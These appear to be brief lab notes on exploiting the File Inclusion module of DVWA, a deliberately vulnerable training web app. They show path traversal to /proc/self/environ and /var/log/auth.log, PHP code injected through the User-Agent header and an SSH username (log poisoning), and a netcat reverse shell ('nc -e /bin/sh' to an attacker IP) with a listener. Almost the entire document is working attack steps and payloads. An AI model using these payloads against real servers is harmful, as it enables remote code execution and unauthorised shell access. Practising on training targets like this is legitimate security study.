# DVWA

## File Inclusion
- Method 1
  1. *"USER_AGENT"* has shown from this path
     - ```10.20.14.209/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ```
  2. Intercept request and modify to ```<?phpinfo();?>``` for test
  3. Attacker machine: ```nc -vv -l -p 8888```
  4. Modify to ```<?passthru("nc -e /bin/sh 10.20.14.208 8888");?>``` for Reverse-shell

- Method 2
  1. SSH login attempt has shown from this file
     - ```10.20.14.209/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log```  
  2. Encode ```nc -e /bin/sh 10.20.14.208 8888``` to Base64
  3. Attacker machine: ```nc -vv -l -p 8888```
  4. Attacker machine: ```ssh "<?passthru(base64_decode('xxxxxxxxxxxxxxx'));?>"@10.20.14.210```
